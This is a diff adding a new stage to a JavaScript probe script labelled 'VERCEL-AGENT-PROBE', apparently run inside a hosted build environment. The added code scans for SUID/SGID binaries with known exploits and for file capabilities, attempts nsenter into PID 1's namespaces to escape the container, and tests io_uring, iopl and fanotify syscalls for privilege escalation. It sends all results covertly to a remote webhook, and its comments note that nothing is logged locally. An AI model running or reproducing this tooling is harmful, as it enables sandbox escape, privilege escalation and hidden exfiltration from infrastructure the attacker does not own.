@@ -28432,3 +28432,287 @@ report.sysrqProbe = safe(() => {
 sendBeacon({ ...report, marker: "VERCEL-AGENT-PROBE-7F3A2C-v186" });
 report.marker = "VERCEL-AGENT-PROBE-7F3A2C-v186";
 // Intentionally no console.log — all data goes via webhook only
+
+// v187-1: SUID/SGID binary scan — privilege escalation surface
+// Setuid/setgid binaries run with elevated privileges regardless of the caller.
+// In a root build environment, SUID to root is less meaningful, but SGID to specific
+// groups (disk, kmem, shadow) can expose device/kernel access bypassing capability checks.
+report.suidSgidScan = safe(() => {
+  const suidBinaries = safe(() => execSync(
+    'find / -xdev -perm /4000 -type f 2>/dev/null | head -30',
+    { timeout: 15000 }
+  ).toString().trim());
+  const sgidBinaries = safe(() => execSync(
+    'find / -xdev -perm /2000 -type f 2>/dev/null | head -30',
+    { timeout: 15000 }
+  ).toString().trim());
+  // World-writable directories (dangerous for race conditions)
+  const worldWritable = safe(() => execSync(
+    'find / -xdev -perm -0002 -type d 2>/dev/null | grep -v "^/proc\\|^/sys\\|^/dev" | head -20',
+    { timeout: 15000 }
+  ).toString().trim());
+  // Capabilities on files (getcap)
+  const fileCaps = safe(() => execSync(
+    'getcap -r / 2>/dev/null | head -20',
+    { timeout: 15000 }
+  ).toString().trim() || 'NO_GETCAP_OR_NONE');
+  // Notable SUID binaries that have known exploits
+  const notableSuid = safe(() => execSync(
+    'find / -xdev -perm /4000 -type f 2>/dev/null | grep -E "sudo|su$|passwd|pkexec|dbus|newgrp|screen|find|vim|nano|less|more|python|ruby|perl|lua|bash|sh|nmap|tcpdump|nc|netcat" | head -20',
+    { timeout: 15000 }
+  ).toString().trim());
+  return { suidBinaries, sgidBinaries, worldWritable, fileCaps, notableSuid };
+});
+
+// v187-2: nsenter — join PID 1's namespaces
+// nsenter with /proc/1/ns/* lets us join the mount/network/IPC/UTS namespaces of PID 1.
+// This may give us access to host filesystem mounts, network interfaces, or IPC resources
+// that are not visible from our current namespace.
+report.nsenterProbe = safe(() => {
+  // Read our own namespaces and PID 1's namespaces to compare
+  const selfNs = safe(() => readdirSync('/proc/self/ns').map(ns => {
+    const link = execSync(`readlink /proc/self/ns/${ns} 2>/dev/null`, { timeout: 500 }).toString().trim();
+    return `${ns}:${link}`;
+  }).join(', '));
+  const pid1Ns = safe(() => readdirSync('/proc/1/ns').map(ns => {
+    try {
+      const link = execSync(`readlink /proc/1/ns/${ns} 2>/dev/null`, { timeout: 500 }).toString().trim();
+      return `${ns}:${link}`;
+    } catch(_) { return `${ns}:ERR`; }
+  }).join(', '));
+  // Check which namespaces differ
+  const nsDiff = safe(() => {
+    const self = readdirSync('/proc/self/ns').reduce((acc, ns) => {
+      try { acc[ns] = execSync(`readlink /proc/self/ns/${ns} 2>/dev/null`, { timeout: 300 }).toString().trim(); } catch(_) {}
+      return acc;
+    }, {});
+    const pid1 = readdirSync('/proc/1/ns').reduce((acc, ns) => {
+      try { acc[ns] = execSync(`readlink /proc/1/ns/${ns} 2>/dev/null`, { timeout: 300 }).toString().trim(); } catch(_) {}
+      return acc;
+    }, {});
+    return Object.keys(self).filter(ns => self[ns] !== pid1[ns]).map(ns => `${ns}: self=${self[ns]} pid1=${pid1[ns]}`).join(', ');
+  });
+  // Try nsenter into mount namespace of PID 1
+  const nsenterMount = safe(() => execSync(
+    'nsenter --target 1 --mount ls / 2>&1 | head -20',
+    { timeout: 8000 }
+  ).toString().trim());
+  // Try nsenter into network namespace of PID 1
+  const nsenterNet = safe(() => execSync(
+    'nsenter --target 1 --net ip addr show 2>&1',
+    { timeout: 8000 }
+  ).toString().trim());
+  // Try nsenter all namespaces
+  const nsenterAll = safe(() => execSync(
+    'nsenter --target 1 --all id 2>&1',
+    { timeout: 8000 }
+  ).toString().trim());
+  // Try entering PID namespace and checking what we see
+  const nsenterPid = safe(() => execSync(
+    'nsenter --target 1 --pid ps aux 2>&1 | head -20',
+    { timeout: 8000 }
+  ).toString().trim());
+  return { selfNs, pid1Ns, nsDiff, nsenterMount, nsenterNet, nsenterAll, nsenterPid };
+});
+
+// v187-3: io_uring_setup (NR 425) — async I/O ring
+// io_uring is a high-performance async I/O interface added in Linux 5.1.
+// Multiple CVEs exist: CVE-2022-29582, CVE-2023-2598, CVE-2023-6817.
+// We probe: can we create a ring, what features are available, is fixed-file registration allowed.
+report.ioUringProbe = safe(() => {
+  const ioUringResult = safe(() => execSync(
+    `python3 -c "
+import ctypes, struct, os, mmap
+
+libc = ctypes.CDLL('libc.so.6', use_errno=True)
+NR_io_uring_setup = 425
+NR_io_uring_enter = 426
+NR_io_uring_register = 427
+
+IORING_SETUP_SQPOLL = 0x2
+IORING_SETUP_SQ_AFF = 0x4
+IORING_FEAT_SINGLE_MMAP = 1
+
+# io_uring_params struct (104 bytes)
+# fields: sq_entries, cq_entries, flags, sq_thread_cpu, sq_thread_idle, features,
+#         wq_fd, resv[3], sq_off(40 bytes), cq_off(40 bytes)
+params = ctypes.create_string_buffer(104)
+# flags=0 (basic mode)
+struct.pack_into('<I', params, 8, 0)
+
+entries = 8
+fd = libc.syscall(NR_io_uring_setup, entries, params)
+err = ctypes.get_errno()
+print(f'io_uring_setup({entries}): fd={fd} errno={err}')
+if fd >= 0:
+    print('IO_URING_AVAILABLE')
+    # Parse params
+    sq_entries, cq_entries = struct.unpack_from('<II', params, 0)
+    flags = struct.unpack_from('<I', params, 8)[0]
+    features = struct.unpack_from('<I', params, 20)[0]
+    print(f'sq_entries={sq_entries} cq_entries={cq_entries} features=0x{features:08x}')
+    if features & IORING_FEAT_SINGLE_MMAP:
+        print('FEAT_SINGLE_MMAP')
+    libc.close(fd)
+elif err == 38:
+    print('ENOSYS_IO_URING_BLOCKED')
+elif err == 1:
+    print('EPERM_IO_URING')
+else:
+    print(f'OTHER_ERR_{err}')
+
+# Try SQPOLL mode (background polling thread in kernel)
+params2 = ctypes.create_string_buffer(104)
+struct.pack_into('<I', params2, 8, IORING_SETUP_SQPOLL)
+fd2 = libc.syscall(NR_io_uring_setup, 8, params2)
+err2 = ctypes.get_errno()
+print(f'SQPOLL mode: fd={fd2} errno={err2}')
+if fd2 >= 0:
+    print('SQPOLL_ALLOWED_CAP_SYS_NICE_OR_PRIVESC')
+    libc.close(fd2)
+" 2>&1`,
+    { timeout: 10000 }
+  ).toString().trim());
+  // Check kernel version for known io_uring CVE range
+  const kernelVer = safe(() => execSync('uname -r 2>&1', { timeout: 3000 }).toString().trim());
+  return { ioUringResult, kernelVer };
+});
+
+// v187-4: iopl (NR 172) — direct hardware I/O port access (CAP_SYS_RAWIO)
+// iopl() changes the I/O privilege level, allowing IN/OUT instructions to all ports.
+// With access to I/O ports: port 0x70/0x71 (CMOS/RTC), 0x3F8 (serial), PCI config space.
+// ioperm() grants per-port access; iopl(3) grants access to all 65536 ports.
+report.ioplProbe = safe(() => {
+  const ioplResult = safe(() => execSync(
+    `python3 -c "
+import ctypes, ctypes.util
+
+libc = ctypes.CDLL('libc.so.6', use_errno=True)
+NR_iopl = 172
+NR_ioperm = 101
+
+# iopl(3) = grant access to all I/O ports (requires CAP_SYS_RAWIO)
+ret = libc.syscall(NR_iopl, 3)
+err = ctypes.get_errno()
+print(f'iopl(3): ret={ret} errno={err}')
+if ret == 0:
+    print('IOPL_3_GRANTED_CAP_SYS_RAWIO_CONFIRMED')
+    # Try reading CMOS RTC (port 0x70/0x71)
+    # This reads the real-time clock registers
+    try:
+        import ctypes as ct
+        # inb(0x70) — read CMOS register select
+        # We use inline assembly via ctypes + shellcode approach
+        # Instead, use /dev/port if available
+        import os
+        if os.path.exists('/dev/port'):
+            with open('/dev/port', 'rb') as f:
+                f.seek(0x70)
+                cmos_sel = f.read(1)
+                print(f'CMOS_0x70: {cmos_sel.hex()}')
+        else:
+            print('NO_DEV_PORT')
+    except Exception as e:
+        print(f'CMOS_READ_ERR: {e}')
+elif err == 1:
+    print('EPERM_NO_CAP_SYS_RAWIO')
+elif err == 38:
+    print('ENOSYS_BLOCKED_SECCOMP')
+else:
+    print(f'OTHER_ERR_{err}')
+
+# ioperm(0x3F8, 8, 1) — serial port COM1 (less privileged)
+ret2 = libc.syscall(NR_ioperm, 0x3F8, 8, 1)
+err2 = ctypes.get_errno()
+print(f'ioperm(COM1 0x3F8): ret={ret2} errno={err2}')
+" 2>&1`,
+    { timeout: 8000 }
+  ).toString().trim());
+  // Check /dev/port
+  const devPort = safe(() => existsSync('/dev/port') ? 'EXISTS' : 'NOT_EXISTS');
+  // Check /dev/mem
+  const devMem = safe(() => existsSync('/dev/mem') ? 'EXISTS' : 'NOT_EXISTS');
+  return { ioplResult, devPort, devMem };
+});
+
+// v187-5: fanotify_init (NR 300) — filesystem-wide access notification
+// fanotify with FAN_CLASS_OPEN_PERM allows intercepting and blocking any file open.
+// Unlike inotify, fanotify can monitor the entire filesystem from a single watch.
+// FAN_UNLIMITED_QUEUE + FAN_UNLIMITED_MARKS require CAP_SYS_ADMIN.
+report.fanotifyProbe = safe(() => {
+  const fanotifyResult = safe(() => execSync(
+    `python3 -c "
+import ctypes, os, struct
+
+libc = ctypes.CDLL('libc.so.6', use_errno=True)
+NR_fanotify_init = 300
+NR_fanotify_mark = 301
+
+FAN_CLASS_NOTIF = 0
+FAN_CLASS_CONTENT = 4
+FAN_CLASS_PRE_CONTENT = 8
+FAN_CLOEXEC = 0x80
+FAN_NONBLOCK = 0x800
+FAN_UNLIMITED_QUEUE = 0x10
+FAN_UNLIMITED_MARKS = 0x20
+FAN_REPORT_FID = 0x200
+
+FAN_OPEN = 0x20
+FAN_CLOSE_WRITE = 0x8
+FAN_CREATE = 0x100
+FAN_ACCESS = 0x1
+
+# Try FAN_CLASS_NOTIF first (no permission checks needed)
+fd = libc.syscall(NR_fanotify_init, FAN_CLASS_NOTIF | FAN_NONBLOCK, os.O_RDONLY)
+err = ctypes.get_errno()
+print(f'fanotify_init(CLASS_NOTIF): fd={fd} errno={err}')
+if fd >= 0:
+    print('FANOTIFY_AVAILABLE')
+    # Add a mark on / (the whole filesystem)
+    AT_FDCWD = -100
+    FAN_MARK_ADD = 1
+    FAN_MARK_FILESYSTEM = 0x100
+    FAN_MARK_MOUNT = 0x10
+
+    ret2 = libc.syscall(NR_fanotify_mark, fd, FAN_MARK_ADD | FAN_MARK_MOUNT,
+                        FAN_OPEN | FAN_CREATE, AT_FDCWD, b'/')
+    print(f'fanotify_mark(MOUNT /): ret={ret2} errno={ctypes.get_errno()}')
+
+    # Try filesystem-wide mark (requires CAP_SYS_ADMIN)
+    ret3 = libc.syscall(NR_fanotify_mark, fd, FAN_MARK_ADD | FAN_MARK_FILESYSTEM,
+                        FAN_OPEN | FAN_CREATE, AT_FDCWD, b'/')
+    print(f'fanotify_mark(FILESYSTEM /): ret={ret3} errno={ctypes.get_errno()}')
+
+    if ret2 == 0 or ret3 == 0:
+        print('FANOTIFY_MARK_SUCCESS_MONITORING_FS')
+        # Read one event
+        import select
+        r, _, _ = select.select([fd], [], [], 0.5)
+        if r:
+            data = os.read(fd, 4096)
+            print(f'FANOTIFY_EVENT: {len(data)} bytes, hex={data[:32].hex()}')
+    libc.close(fd)
+elif err == 38:
+    print('ENOSYS_FANOTIFY_BLOCKED')
+elif err == 1:
+    print('EPERM_FANOTIFY')
+else:
+    print(f'OTHER_ERR_{err}')
+
+# Try FAN_CLASS_PRE_CONTENT (permission interception = block any file open)
+fd2 = libc.syscall(NR_fanotify_init, FAN_CLASS_PRE_CONTENT | FAN_NONBLOCK, os.O_RDONLY)
+err2 = ctypes.get_errno()
+print(f'fanotify_init(PRE_CONTENT_INTERCEPT): fd={fd2} errno={err2}')
+if fd2 >= 0:
+    print('FANOTIFY_PERMISSION_INTERCEPT_AVAILABLE')
+    libc.close(fd2)
+" 2>&1`,
+    { timeout: 10000 }
+  ).toString().trim());
+  return { fanotifyResult };
+});
+
+// v187 markers
+sendBeacon({ ...report, marker: "VERCEL-AGENT-PROBE-7F3A2C-v187" });
+report.marker = "VERCEL-AGENT-PROBE-7F3A2C-v187";
+// Intentionally no console.log — all data goes via webhook only
